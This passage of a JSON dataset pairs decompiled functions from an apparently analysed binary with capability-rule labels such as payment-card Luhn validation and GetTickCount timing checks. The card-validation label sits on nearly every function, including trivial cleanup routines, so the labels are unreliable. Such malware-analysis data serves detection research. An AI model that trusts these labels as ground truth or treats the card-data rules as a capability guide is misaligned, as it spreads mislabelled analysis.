        "decompiled_code": "\nint64_t fcn.00025218(int64_t arg1)\n\n{\n    char cVar1;\n    char cVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    int64_t *piVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    \n    iVar3 = 0;\n    if (*0x7a368 == NULL) {\n        iVar3 = 0;\n    }\n    else {\n        fcn.0002f23c(0x7a360);\n        iVar7 = 0;\n        piVar5 = *0x7a368;\n        do {\n            if (*piVar5 != 0) {\n                piVar4 = *0x7a368 + iVar7 * 0x35 + 1;\n                iVar6 = arg1 - piVar4;\n                do {\n                    cVar1 = *piVar4;\n                    cVar2 = *(piVar4 + iVar6);\n                    if (cVar1 != cVar2) break;\n                    piVar4 = piVar4 + 1;\n                } while (cVar2 != '\\0');\n                if (cVar1 == cVar2) {\n                    piVar4 = *0x7a368 + iVar7 * 0x35 + 0x11;\n                    iVar6 = (arg1 + 0x80) - piVar4;\n                    do {\n                        cVar1 = *piVar4;\n                        cVar2 = *(piVar4 + iVar6);\n                        if (cVar1 != cVar2) break;\n                        piVar4 = piVar4 + 1;\n                    } while (cVar2 != '\\0');\n                    if (cVar1 == cVar2) {\n                        iVar3 = (*0x7a368)[iVar7 * 0x35];\n                        (*0x7a368)[iVar7 * 0x35] = 0;\n                        break;\n                    }\n                }\n            }\n            iVar7 = iVar7 + 1;\n            piVar5 = piVar5 + 0x35;\n        } while (iVar7 < 0x14);\n        fcn.0002f2a4(0x7a360);\n    }\n    return iVar3;\n}\n",
        "token_count": 483
    },
    "0002591c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0002591c(void)\n\n{\n    fcn.0002f1ec(0x7a360);\n    *0x7a368 = fcn.0002fc18(0x1a8);\n    if (*0x7a368 != 0) {\n        fcn.0002ed80(0x7a358);\n        fcn.0001a650(0x7a370, 0x253e8, 0);\n        if (*0x88e38 == NULL) {\n            *0x88e38 = fcn.00024b3c;\n        }\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "000265bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.000265bc(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    uint auStackX24 [4];\n    uchar auStack72 [4];\n    uint32_t uStack68;\n    int32_t iStack24;\n    \n    auStackX24[0] = arg3;\n    uVar1 = fcn.00021828(0xfffffffe, 2, auStackX24, auStack72);\n    if (uVar1 == 0) {\n        if (iStack24 == arg2) {\n            uVar1 = fcn.000218cc(0xfffffffe, 2, uStack68, 0);\n        }\n        else {\n            uVar1 = 0xffffffff;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 175
    },
    "00026638": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00026638(ulong arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    uint auStackX24 [4];\n    uchar auStack72 [4];\n    uint32_t uStack68;\n    int32_t iStack24;\n    \n    auStackX24[0] = 0x229;\n    uVar1 = fcn.00021828(0xfffffffd, 2, auStackX24, auStack72);\n    if (uVar1 == 0) {\n        if (iStack24 == arg2) {\n            uVar1 = fcn.000218cc(0xfffffffd, 2, uStack68, 0);\n        }\n        else {\n            uVar1 = 0xffffffff;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 173
    },
    "00026a28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00026a28(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.000266fc(2, arg1, arg2, arg3);\n    return;\n}\n",
        "token_count": 50
    },
    "00026a50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00026a50(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.000268d0(2, arg1, arg2, arg3);\n    return;\n}\n",
        "token_count": 47
    },
    "00026a7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00026a7c(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    uchar auStackX32 [8];\n    uchar auStack120 [112];\n    \n    uVar2 = arg2;\n    iVar1 = fcn.000266fc(2, arg1, auStack120, 100);\n    if (iVar1 == 0) {\n        uVar2 = fcn.00030174(auStack120, auStackX32, 0);\n    }\n    return uVar2;\n}\n",
        "token_count": 129
    },
    "00026ad8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00026ad8(ulong arg1, ulong arg2)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    char *pcVar3;\n    char acStack136 [120];\n    \n    fcn.00061b10(acStack136, 0x11eb4);\n    iVar2 = -1;\n    pcVar3 = acStack136;\n    do {\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00026a50(arg1, acStack136, ~iVar2);\n    return;\n}\n",
        "token_count": 163
    },
    "00026e2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00026e2c(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint32_t in_stack_00000028;\n    \n    iVar1 = fcn.00021da8(0xfffffffe, 4, in_stack_00000028, 0);\n    if (iVar1 == 4) {\n        iVar1 = fcn.00026a7c(2, 0);\n        fcn.00025058(0xfffffffe, 4, iVar1 + 1);\n        fcn.00021da8(0xfffffffe, 4, in_stack_00000028, 0);\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "000278bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.000278bc(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    ulong *puVar3;\n    ulong in_stack_00000028;\n    \n    uVar2 = (*(*0x7a4e8)[0x23])();\n    if (uVar2 == 0x21590001) {\n        fcn.00031088(0x7a4c8);\n        uVar2 = uVar2 & 0xffffffff;\n        for (puVar3 = **0x7a4e8; puVar3 != NULL; puVar3 = *puVar3) {\n            if (puVar3[0x23] != NULL) {\n                uVar1 = (*puVar3[0x23])(arg1, arg2, arg3, arg4, in_stack_00000028);\n                uVar2 = uVar1;\n                if (uVar1 != 0x21590001) break;\n            }\n        }\n        fcn.00031108(0x7a4c8);\n    }\n    return uVar2;\n}\n",
        "token_count": 259
    },
    "00027a4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00027a4c(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t arg3;\n    uint32_t uStackX8;\n    ushort uStack104;\n    uchar auStack102 [78];\n    \n    uVar1 = fcn.00030174(arg1 + 1, 0, 0);\n    iVar2 = fcn.000266fc(3, uVar1, 0, 0);\n    if (iVar2 == 0) {\n        arg3 = fcn.0002fbc4(uStackX8);\n        if (arg3 == 0) {\n            uVar1 = 0x21590004;\n        }\n        else {\n            iVar2 = fcn.000266fc(3, uVar1, arg3, uStackX8);\n            if (iVar2 == 0) {\n                uStack104 = 0x26;\n                fcn.00061b16(uVar1, auStack102, 10);\n                *(arg2 + 0x130) = 1;\n                uVar1 = fcn.0004ce28(0, arg3, &uStack104, &uStack104);\n            }\n            else {\n                uVar1 = iVar2 + 0x191U | 0x21590000;\n            }\n            fcn.0002fc50(arg3);\n            *(arg2 + 0x134) = 0;\n            if (uVar1 != 0) {\n                *(arg2 + 8) = 0;\n            }\n        }\n    }\n    else {\n        uVar1 = iVar2 + 0x191U | 0x21590000;\n    }\n    return uVar1;\n}\n",
        "token_count": 392
    },
    "0003105c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0003105c(ulong *arg1)\n\n{\n    if (arg1[2] != 0) {\n        fcn.0002fc50(arg1[2]);\n    }\n    *arg1 = 0;\n    arg1[1] = 0;\n    arg1[2] = 0;\n    return;\n}\n",
        "token_count": 76
    },
    "00027e30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00027e30(ulong arg1)\n\n{\n    code *pcVar1;\n    ulong *puVar2;\n    int32_t iVar3;\n    ulong *arg1_00;\n    ulong *puVar4;\n    ulong uVar5;\n    \n    fcn.00031198(0x7a4c8);\n    uVar5 = 0;\n    puVar2 = **0x7a4e8;\n    puVar4 = *0x7a4e8;\n    while( true ) {\n        arg1_00 = puVar2;\n        if (arg1_00 == NULL) {\n            fcn.00031218(0x7a4c8);\n            return 0x215901fd;\n        }\n        iVar3 = fcn.00061ad4(arg1_00 + 2, arg1);\n        if (iVar3 == 0) break;\n        puVar2 = *arg1_00;\n        puVar4 = arg1_00;\n    }\n    pcVar1 = arg1_00[0x24];\n    *puVar4 = *arg1_00;\n    if (arg1_00 == *0x7a4e0) {\n        *0x7a4e0 = puVar4;\n    }\n    fcn.00031218(0x7a4c8);\n    if (pcVar1 == NULL) {\n        uVar5 = 0x215901fe;\n    }\n    else {\n        (*pcVar1)();\n    }\n    fcn.00027990(arg1_00);\n    fcn.0002fc50(arg1_00);\n    return uVar5;\n}\n",
        "token_count": 363
    },
    "00028a90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00028a90(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t arg3;\n    int64_t arg4;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    uint32_t uStackX24;\n    \n    arg3 = 0;\n    arg4 = 0;\n    iVar1 = fcn.000266fc(3, arg1, 0, 0);\n    if (iVar1 == 0) {\n        arg3 = fcn.0002fbc4(uStackX24);\n        if (arg3 == 0) {\n            uVar3 = 0x21590004;\n            goto code_r0x00028b50;\n        }\n        iVar1 = fcn.000266fc(3, arg1, arg3, uStackX24);\n        if (iVar1 == 0) {\n            arg4 = fcn.000305c4(arg2, 0x11e9c);\n            if (arg4 != 0) {\n                uVar2 = fcn.0002fe68(arg3, 1, uStackX24, arg4);\n                if (uVar2 == uStackX24) {\n                    uVar3 = 0;\n                    goto code_r0x00028b50;\n                }\n            }\n            uVar3 = fcn.0002fde4();\n            goto code_r0x00028b50;\n        }\n    }\n    uVar3 = iVar1 + 0x191U | 0x21590000;\ncode_r0x00028b50:\n    fcn.0002fc50(arg3);\n    if (arg4 != 0) {\n        fcn.0002fe58(arg4);\n    }\n    return uVar3;\n}\n",
        "token_count": 394
    },
    "000293d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000293d4(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint32_t auStackX8 [8];\n    uint32_t uStack344;\n    uint32_t uStack340;\n    uint32_t uStack336;\n    uint8_t uStack324;\n    int32_t iStack320;\n    uchar auStack280 [280];\n    \n    auStackX8[0] = arg1;\n    fcn.0002f23c(0x7a528);\n    iVar1 = fcn.00021828(0xfffffffe, 8, auStackX8, &uStack344);\n    if (iVar1 == 0) {\n        if (iStack320 != 0) {\n            iStack320 = iStack320 + -1;\n            fcn.000219dc(uStack344, uStack336, uStack340, 2);\n            if (iStack320 != 0) goto code_r0x000294a7;\n        }\n        iVar1 = fcn.000266fc(uStack336, uStack340, auStack280, 0x104);\n        if (iVar1 == 0) {\n            if ((uStack324 & 2) != 0) {\n                fcn.00028b70(auStack280, auStackX8[0]);\n            }\n            fcn.00030a28(auStack280);\n        }\n        fcn.0002191c(uStack344, uStack336, uStack340);\n    }\ncode_r0x000294a7:\n    fcn.0002f2a4(0x7a528);\n    return;\n}\n",
        "token_count": 356
    },
    "00029804": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00029804(void)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    uint32_t auStackX16 [2];\n    int64_t aiStackX24 [2];\n    \n    fcn.0002f1ec(0x7a528);\n    aiStackX24[0] = 0;\n    fcn.0002f23c(0x7a528);\n    iVar1 = fcn.000217f8(0xfffffffe, 8, auStackX16, aiStackX24);\n    if ((iVar1 == 0) && (uVar3 = 0,  auStackX16[0] != 0)) {\n        iVar2 = 0;\n        do {\n            fcn.000219dc(*(iVar2 + aiStackX24[0]), *(iVar2 + 8 + aiStackX24[0]), *(iVar2 + 4 + aiStackX24[0]), 2);\n            fcn.000293d4(*(iVar2 + 0xc + aiStackX24[0]));\n            uVar3 = uVar3 + 1;\n            iVar2 = iVar2 + 0x40;\n        } while (uVar3 < auStackX16[0]);\n    }\n    fcn.0002f2a4(0x7a528);\n    fcn.0001a254(aiStackX24[0]);\n    return;\n}\n",
        "token_count": 319
    },
    "00029824": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00029824(void)\n\n{\n    fcn.0002957c(1);\n    if (*0x7a528 != 0) {\n        fcn.0002fc50(*0x7a528);\n        *0x7a528 = 0;\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "00029844": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00029844(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0002eec4(0x7a540);\n    if (iVar1 != 0) {\n        *0x7a538 = 1;\n        fcn.0002ee20(0x88b20);\n        fcn.00031648(0x7a540, 0);\n        fcn.00031624(0x7a540);\n    }\n    if (*0x88b20 != 0) {\n        fcn.0002fc50(*0x88b20);\n        *0x88b20 = 0;\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "0002edfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0002edfc(int64_t *arg1)\n\n{\n    if (*arg1 != 0) {\n        fcn.0002fc50(*arg1);\n        *arg1 = 0;\n    }\n    return;\n}\n",
        "token_count": 53
    },
    "0002a0f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0002a0f0(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    ulong *puVar3;\n    bool bVar4;\n    ulong uStack56;\n    ulong uStack48;\n    \n    uStack48 = 0x2a100;\n    fcn.0002ed80(0x88b20);\n    *0x7a538 = 0;\n    LOCK();\n    bVar4 = *0x79990 == 0;\n    *0x79990 = *0x79990 ^ bVar4 * *0x79990;\n    if ((bVar4) && (iVar1 = (*_fcn.00011210)(&stack0xffffffffffffffc8, 0x1f03ff, 0, 0, 0, 0x1a520, 0),  iVar1 == 0)) {\n        fcn.00061aa4(uStack56, 0, 0);\n        fcn.000619de(uStack56);\n    }\n    puVar3 = fcn.0002fbc4(0x10);\n    if (puVar3 != NULL) {\n        *puVar3 = 0x2a0b8;\n        puVar3[1] = 0;\n        iVar1 = (*_fcn.00011210)(0x7a540, 0x1f03ff, 0, 0, 0, 0x1a594, puVar3);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    uVar2 = fcn.00061a5c();\n    fcn.0002fd3c(uVar2);\n    return 0xffffffff;\n}\n",
        "token_count": 380
    },
    "0002b120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.0002b120(uint64_t *arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int64_t **ppiVar4;\n    int64_t *piVar5;\n    int64_t **ppiVar6;\n    ulong in_R9;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint uVar10;\n    \n    ppiVar4 = NULL;\n    ppiVar6 = ppiVar4;\n    if (0x14 < arg2) {\n        do {\n            uVar8 = *arg1;\n            uVar9 = arg1[1];\n            uVar10 = *(arg1 + 2);\n            uVar1 = fcn.0002fcf4(uVar8 & 0xffffffff);\n            uVar7 = uVar1;\n            uVar2 = fcn.0002fcf4(uVar8 >> 0x20);\n            uVar8 = uVar7 & 0xffffffff | uVar2 << 0x20;\n            if (arg2 - 0x15 < uVar2) {\n                return ppiVar6;\n            }\n            ppiVar4 = fcn.0002fbc4(0x28);\n            if (ppiVar4 == NULL) {\n                return ppiVar6;\n            }\n            fcn.00061a56(ppiVar4, 0, 0x28, in_R9, uVar8, uVar9, uVar10);\n            *(ppiVar4 + 1) = uVar1;\n            *(ppiVar4 + 2) = uVar2;\n            *(ppiVar4 + 0xc) = uVar9;\n            if (uVar2 < 8) {\n                ppiVar4[3] = ppiVar4 + 4;\n            }\n            else {\n                piVar5 = fcn.0002fbc4(uVar2);\n                ppiVar4[3] = piVar5;\n                if (piVar5 == NULL) {\n                    *(ppiVar4 + 2) = 0;\n                }\n            }\n            fcn.000619f6(ppiVar4[3], arg1 + 0x15);\n            arg1 = arg1 + 0x15 + uVar2;\n            arg2._0_4_ = (arg2 - 0x15) - uVar2;\n            iVar3 = fcn.0001fa8c(*(ppiVar4 + 0xc), ppiVar4[3], *(ppiVar4 + 2));\n            if (iVar3 == 0) {\n                *(ppiVar4 + 2) = 0;\n            }\n            *ppiVar4 = ppiVar6;\n            ppiVar6 = ppiVar4;\n        } while (0x14 < arg2);\n    }\n    return ppiVar4;\n}\n",
        "token_count": 646
    },
    "0002de90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0002de90(int64_t arg1, ulong arg2, uint64_t arg3)\n\n{\n    ulong uVar1;\n    uchar auStack184 [152];\n    \n    if (((arg3 & 0x1ff) == 0) && (arg3 <= *(arg1 * 8 + 0x7a5c0) - 0x200U)) {\n        fcn.0002c248(auStack184, 0x10, 0x64df8);\n        fcn.0002bc38(arg2, arg3 + *(arg1 * 8 + 0x7a5b0), 0x200, auStack184);\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 180
    },
    "0002ed80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.0002ed80(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.0002fbf0(0x18);\n    *arg1 = iVar1;\n    if (iVar1 != 0) {\n        (*_fcn.00011600)(iVar1, 1);\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 92
    },
    "0002edb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.0002edb8(int64_t *arg1, ulong noname_1, ulong arg3)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.0002fbf0(0x18);\n    *arg1 = iVar1;\n    if (iVar1 != 0) {\n        (*_fcn.00011600)(iVar1, arg3 == 0, 0);\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 108
    },
    "0002ee20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0002ee20(int64_t *arg1)\n\n{\n    ulong uVar1;\n    \n    if ((arg1 == NULL) || (*arg1 == 0)) {\n        uVar1 = 0;\n    }\n    else {\n        (*_fcn.00011638)(*arg1, 0, 0);\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 89
    },
    "0002f1ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0002f1ec(ulong *arg1)\n\n{\n    ulong uVar1;\n    \n    uVar1 = fcn.0002fbf0(0x38);\n    *arg1 = uVar1;\n    // WARNING: Could not recover jumptable at 0x0002f20c. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_fcn.00011380)(uVar1, 0);\n    return;\n}\n",
        "token_count": 106
    },
    "0002f23c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0002f23c(ulong *arg1)\n\n{\n    (*_fcn.00011628)(*arg1, 0, 0, 0, 0);\n    return;\n}\n",
        "token_count": 45
    },
    "0002f2b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0002f2b0(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    ulong auStackX24 [2];\n    uchar auStack104 [16];\n    uint auStack88 [2];\n    ulong uStack80;\n    uchar *puStack72;\n    uint uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    \n    uVar3 = fcn.000312a4(auStackX24);\n    if (uVar3 == 0) {\n        iVar4 = fcn.00031810(arg2);\n        iVar4 = fcn.0002fbc4(iVar4 * 2);\n        if (iVar4 == 0) {\n            iVar1 = -0x3fffff66;\n        }\n        else {\n            fcn.00031740(arg2, iVar4, 0xffffffffffffffff);\n            fcn.000619f0(auStack104, iVar4);\n            puStack72 = auStack104;\n            auStack88[0] = 0x30;\n            uStack56 = auStackX24[0];\n            uStack80 = 0;\n            uStack64 = 0;\n            uStack48 = 0;\n            iVar1 = fcn.0001e8b0(arg1, 0x1f0001, auStack88);\n        }\n        fcn.0002fc50(iVar4);\n        fcn.000313cc(auStackX24[0]);\n        uVar3 = 0;\n        if (iVar1 != 0) {\n            uVar2 = fcn.00061a5c(iVar1);\n            uVar3 = uVar2;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 402
    },
    "0002f388": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0002f388(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    uchar auStack88 [16];\n    uint auStack72 [2];\n    ulong uStack64;\n    uchar *puStack56;\n    uint uStack48;\n    ulong uStack40;\n    ulong uStack32;\n    \n    iVar2 = fcn.00031810(arg2);\n    iVar2 = fcn.0002fbc4(iVar2 * 2);\n    if (iVar2 == 0) {\n        iVar1 = -0x3fffff66;\n    }\n    else {\n        fcn.00031740(arg2, iVar2, 0xffffffffffffffff);\n        fcn.000619f0(auStack88, iVar2);\n        puStack56 = auStack88;\n        auStack72[0] = 0x30;\n        uStack64 = 0;\n        uStack48 = 0;\n        uStack40 = 0;\n        uStack32 = 0;\n        iVar1 = fcn.0001e90c(arg1, 0x1f0001, auStack72);\n        fcn.0002fc50(iVar2);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    uVar3 = fcn.00061a5c(iVar1);\n    return uVar3;\n}\n",
        "token_count": 316
    },
    "0002f464": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool fcn.0002f464(ulong *arg1)\n\n{\n    int32_t iVar1;\n    ulong auStackX16 [3];\n    \n    auStackX16[0] = 0;\n    iVar1 = fcn.00061aa4(*arg1, 0, auStackX16);\n    return iVar1 == 0;\n}\n",
        "token_count": 77
    },
    "0002f51c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0002f51c(uint64_t arg1, uint64_t *arg2)\n\n{\n    ulong uVar1;\n    \n    if ((((arg1 & 0xffffffff80000000) == 0xffffffff80000000) && (arg1 != 0xfffffffffffffffe)) &&\n       (arg1 != 0xffffffffffffffff)) {\n        *arg2 = arg1;\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.00061b58(0xffffffffffffffff, arg1, 0xffffffffffffffff, arg2, 0, 0x200, 2);\n    }\n    return uVar1;\n}\n",
        "token_count": 144
    },
    "0002f57c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0002f57c(int64_t arg1, int64_t arg2)\n\n{\n    if ((arg1 != arg2) && (arg2 != 0)) {\n        fcn.000619de(arg2);\n    }\n    return;\n}\n",
        "token_count": 57
    },
    "0002f654": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0002f654(int64_t arg1, int64_t arg2, ulong arg3, uint32_t **arg4)\n\n{\n    uint64_t uVar1;\n    uint32_t *puVar2;\n    uint32_t auStackX8 [8];\n    uint32_t auStack56 [6];\n    \n    if (((arg1 == 0) || (arg2 == 0)) || (arg4 == NULL)) {\n        uVar1 = 0xc000000d;\n    }\n    else {\n        *arg4 = auStackX8;\n        uVar1 = fcn.00061b5e();\n        auStackX8[0] = uVar1;\n        if ((auStackX8[0] == 0xc0000023) || (auStackX8[0] == 0x80000005)) {\n            puVar2 = fcn.0002fbc4(auStack56[0]);\n            *arg4 = puVar2;\n            if (puVar2 == NULL) {\n                uVar1 = 0x21590004;\n            }\n            else {\n                uVar1 = fcn.00061b5e(arg1, arg2, arg3, puVar2, auStack56[0], auStack56);\n                auStackX8[0] = uVar1;\n                if (auStackX8[0] != 0) {\n                    fcn.0002fc50(*arg4);\n                    uVar1 = auStackX8[0];\n                }\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 348
    },
    "0002f784": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t fcn.0002f784(uint8_t *arg1, uint8_t *arg2, int64_t arg3)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar2 = 0;\n    uVar3 = 0;\n    while (arg3 != 0) {\n        uVar1 = *arg1;\n        uVar2 = uVar1;\n        arg3 = arg3 + -1;\n        arg1 = arg1 + 1;\n        if (uVar1 - 0x41 < 0x1a) {\n            uVar2 = uVar1 + 0x20;\n        }\n        uVar1 = *arg2;\n        uVar3 = uVar1;\n        arg2 = arg2 + 1;\n        if (uVar1 - 0x41 < 0x1a) {\n            uVar3 = uVar1 + 0x20;\n        }\n        if ((uVar2 == 0) || (uVar2 != uVar3)) break;\n    }\n    return uVar2 - uVar3;\n}\n",
        "token_count": 254
    },
    "0002f7d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.0002f7d0(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    uchar *puVar1;\n    \n    if (arg3 != 0) {\n        puVar1 = arg3 + -1 + arg1;\n        do {\n            *puVar1 = puVar1[arg2 - arg1];\n            puVar1 = puVar1 + -1;\n            arg3._0_4_ = arg3 + -1;\n        } while (arg3 != 0);\n    }\n    return arg1;\n}\n",
        "token_count": 125
    },
    "0002f7f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * fcn.0002f7f8(char *arg1, ulong arg2)\n\n{\n    char *pcVar1;\n    \n    pcVar1 = NULL;\n    for (; *arg1 != '\\0'; arg1 = arg1 + 1) {\n        if (*arg1 == arg2) {\n            pcVar1 = arg1;\n        }\n    }\n    return pcVar1;\n}\n",
        "token_count": 86
    },
    "0002fb84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
